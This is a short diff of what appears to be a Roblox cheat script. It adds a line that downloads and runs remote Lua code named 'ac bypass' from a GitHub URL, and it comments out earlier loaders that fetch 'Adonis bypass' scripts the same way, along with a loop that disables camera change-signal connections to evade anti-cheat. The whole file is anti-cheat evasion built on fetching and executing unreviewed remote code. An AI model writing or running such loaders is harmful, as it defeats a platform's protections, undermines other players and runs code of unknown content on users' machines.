@@ -1,3 +1,7 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/scripts/refs/heads/main/ac%20bypass",true))()
+
+--[[
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua", true))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/RelkzzRebranded/Bypassed---OBFUSCATED..../main/Adonis%20BYPASS.lua"))()
 
@@ -132,3 +136,4 @@ for _, con in next, getconnections(workspace.CurrentCamera:GetPropertyChangedSig
    task.wait()
     con:Disable()
 end
+]]
